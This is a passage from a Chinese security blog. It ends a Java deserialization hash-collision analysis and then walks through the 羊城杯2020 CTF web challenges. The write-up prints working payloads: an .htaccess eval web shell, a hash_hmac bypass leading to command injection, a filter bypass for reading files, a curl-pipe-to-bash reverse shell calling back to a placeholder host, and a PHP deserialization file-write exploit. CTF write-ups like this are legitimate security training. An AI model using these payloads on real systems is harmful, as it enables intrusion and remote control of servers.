<p><img src="https://www.hualigs.cn/image/60860e00d108d.jpg"></p>
<h1 id="Hash绕过"><a href="#Hash绕过" class="headerlink" title="Hash绕过"></a>Hash绕过</h1><p>java.util.HashMap#put</p>
<p>条件<code>e.hash == hash</code>，也就是满足<code>hash(templates)== hash(proxy)</code></p>
<p>调用了<code>hash()</code></p>
<p><img src="https://www.hualigs.cn/image/60860dfea0329.jpg"></p>
<p>java.util.HashMap#hash</p>
<p>进入<code>hash()</code>函数，这里调用了传入对象<code>k</code>的<code>hashCode()</code>方法，意味着有可能控制hash值，这里的<code>k</code>为创建的代理实例对象。接着调用了<code>hashCode</code></p>
<p><img src="https://www.hualigs.cn/image/60860dfea0750.jpg"></p>
<p>因为使用了动态代理，调用<code>hash(proxy)</code>时会自动跳转到<code>AnnotationInvocationHandler.invoke()</code></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#invoke</p>
<p><img src="https://www.hualigs.cn/image/60860dffcd946.jpg">sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        Entry var3;</span><br><span class="line">        <span class="comment">//this.memberValues由构造函数传入的，可以控制，等于map</span></span><br><span class="line">        Iterator var2 = <span class="keyword">this</span>.memberValues.entrySet().iterator();<span class="comment">//获取遍历器</span></span><br><span class="line">        <span class="keyword">for</span>( ;var2.hasNext(); ) &#123;</span><br><span class="line">            var3 = (Entry)var2.next();</span><br><span class="line">            String key = var3.getKey();<span class="comment">//（可控map的键）</span></span><br><span class="line">            Object value = var3.getValue()；<span class="comment">//（可控map的值）</span></span><br><span class="line">            var1 += <span class="number">127</span> * </span><br><span class="line">                key.hashCode() ^    <span class="comment">//可控map的键 的 hashCode                </span></span><br><span class="line">                memberValueHashCode(value); <span class="comment">//可控map的值的 hashCode</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>sun.reflect.annotation.AnnotationInvocationHandler#memberValueHashCode</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">memberValueHashCode</span><span class="params">(Object var0)</span> </span>&#123;</span><br><span class="line">        Class var1 = var0.getClass();</span><br><span class="line">        <span class="keyword">if</span> (!var1.isArray()) &#123;<span class="comment">//不是数组的话获取传入值的hashCode。</span></span><br><span class="line">            <span class="keyword">return</span> var0.hashCode(); <span class="comment">//返回var0这个对象的hashCode</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<p>实际执行</p>
<p><strong>Proxy的hashCode = 127 * 可控键的hashCode ^ 可控值的hashCode == TemplatesImpl的hashCode</strong></p>
<p>只要让可控键的hashCode为0即可，利用<code>f5a5a608</code>的hashcode为0，字符串的hashcode也为0，在POC中构造<code>map.put(&quot;f5a5a608&quot;, templates)</code>,</p>
<p>这样</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var1 &#x3D; 127 * 0 ^ templates的hashCode</span><br><span class="line">var1 &#x3D; templates的hashCode</span><br></pre></td></tr></table></figure>



<h1 id="map-put"><a href="#map-put" class="headerlink" title="map.put"></a>map.put</h1><p>java.util.HashSet#add</p>
<p><img src="https://www.hualigs.cn/image/60860dfe68edf.jpg"></p>
<p>payload中把<code>map.put(&quot;f5a5a608&quot;, templates)</code>放在最后，这是因为<code>add</code>方法中调用了<code>map.put</code>，如果放在前面就会满足条件直接在本地触发命令执行，经过序列化之后的数据不能反序列化成功。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-22T23:44:21.000Z" title="2021-04-22T23:44:21.000Z">2021-04-23</time>发表</span><span class="level-item"><time dateTime="2021-04-26T01:07:53.492Z" title="2021-04-26T01:07:53.492Z">2021-04-26</time>更新</span><span class="level-item">8 分钟读完 (大约1188个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/">羊城杯2020复现</a></h1><div class="content"><h1 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h1><p>给出源码，可以看到只能上传一个文件，并且文件名只能为<code>.xxxx</code>这种形式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$content</span>,<span class="string">&#x27;on&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;html&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;type&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;flag&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;upload&#x27;</span>) || stristr(<span class="variable">$content</span>,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, <span class="variable">$filename</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink(<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>, <span class="variable">$content</span> . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>利用<code>.htaccess</code>中的<code>auto_prepend_file</code>，在运行php文件前会自动包含指定的文件，这里过滤了<code>file</code>，可以用<code>\</code>绕过，把恶意代码注释掉，最后加上<code>\</code>转义，因为最后拼接上了<code>Hello, world</code>，需要加上\来换行注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;\</span><br></pre></td></tr></table></figure>



<p>最终结果，运行任何一个php文件的时候都会自动包含.htaccess文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\le &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php @eval($_GET[&#39;cmd&#39;]); ?&gt;\Hello, world</span><br></pre></td></tr></table></figure>





<p>请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;adc3ba58-b6c5-466a-acb3-7d3434dafb0c.node3.buuoj.cn&#x2F;?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fi\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_GET[%27cmd%27])%3b%20%3f%3E\</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60861093af5d8.jpg"></p>
<p>执行成功，接下来读取flag即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;adc3ba58-b6c5-466a-acb3-7d3434dafb0c.node3.buuoj.cn&#x2F;index.php?cmd&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60861095d2236.jpg"></p>
<h1 id="Blackcat"><a href="#Blackcat" class="headerlink" title="Blackcat"></a>Blackcat</h1><p>查看源码发现<code>Hei_Mao_Jing_Chang.mp3</code>文件</p>
<p><img src="https://www.hualigs.cn/image/6086109441bec.jpg"></p>
<p>访问Hei_Mao_Jing_Chang.mp3得到源码</p>
<p><img src="https://www.hualigs.cn/image/6086109538553.jpg"></p>
<p><code>hash_hmac</code>函数会把第二个参数作为内容，第三个参数作为密钥，用第一个参数作为算法进行加密，我们只要给<code>$_POST[&#39;White-cat-monitor&#39;]</code>传入一个数组，hash_hmac函数就会返回null，这样密钥就可控了，我根据密钥加密要执行的命令，然后把加密后的hash传入<code>$_POST[&#39;Black-Cat-Sheriff&#39;]</code>即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$clandestine</span> = getenv(<span class="string">&quot;clandestine&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>]))</span><br><span class="line">    <span class="variable">$clandestine</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;White-cat-monitor&#x27;</span>], <span class="variable">$clandestine</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$hh</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>], <span class="variable">$clandestine</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$hh</span> !== <span class="variable">$_POST</span>[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">&quot;nc&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>]);</span><br></pre></td></tr></table></figure>





<p>生成hash值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hh</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;One-ear&#x27;</span>], <span class="literal">null</span>);</span><br><span class="line">var_dump(<span class="variable">$hh</span>);</span><br></pre></td></tr></table></figure>

<p>post数据，buu的flag在env里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Black-Cat-Sheriff&#x3D;afa668e24c118929d895750ef36b2a6382377049b3fe4a00f5a0dcdf2dc8b69a&amp;One-ear&#x3D;asd;env&amp;White-cat-monitor[]&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/608610910d472.jpg"></p>
<h1 id="Easyphp2"><a href="#Easyphp2" class="headerlink" title="Easyphp2"></a>Easyphp2</h1><p>存在robots.txt</p>
<p><img src="https://img03.sogoucdn.com/app/a/100520146/D0B189B21794B126D071578055374C9B"></p>
<p>这里发现base64、rot13都被过滤，用url二次编码绕过，用<code>%6%32</code>代替<code>b</code>，<code>%32</code>解码为<code>2</code>，合并成<code>%62</code>解码为<code>b</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;17a28883-1f23-40fd-a3f6-98a5cf1cd5fc.node3.buuoj.cn&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.%6%32ase64-encode&#x2F;resource&#x3D;GWHT.php</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/6086109105504.jpg"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=<span class="string">&quot;question.jpg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span> /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;count&quot;</span> rows=<span class="number">10</span> cols=<span class="number">50</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$_GET</span>[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, <span class="variable">$count</span>))&#123;</span><br><span class="line">        	<span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . <span class="variable">$count</span> . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<p>读取check.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span> = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>反弹shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;x.x.x.x&#x2F;qwzf|bash</span><br></pre></td></tr></table></figure>

<p>qwzf文件内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;12345 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/608610914c607.jpg"></p>
<p><img src="https://www.hualigs.cn/image/608610911f6c6.jpg"></p>
<p>在env中找到flag</p>
<p><img src="https://www.hualigs.cn/image/6086109139433.jpg"></p>
<h1 id="EasySer"><a href="#EasySer" class="headerlink" title="EasySer"></a>EasySer</h1><p>源码中有提示访问ser.php</p>
<p><img src="https://www.hualigs.cn/image/608610916ae9d.jpg"></p>
<p>ssrf读取ser.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;1d376013-e9d5-4028-bc85-8fd14af0feea.node3.buuoj.cn&#x2F;star1.php&#x2F;star1.php?path&#x3D;http%3A%2F%2F127.0.0.1%2Fser.php</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/608610916ba11.jpg"></p>
<p>file_put_contents方法可以被利用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;&#x27;</span>,<span class="variable">$text</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = <span class="variable">$text</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$d</span>   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$a</span>= <span class="variable">$d</span>. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">         @file_put_contents(<span class="keyword">$this</span>-&gt; file,<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>



<p>构造exp，这里用<code>php://filter</code>绕过拼接的<code>&lt;?php die(&quot;nononon&quot;);?&gt;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hero</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero=<span class="keyword">new</span> Yongen();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 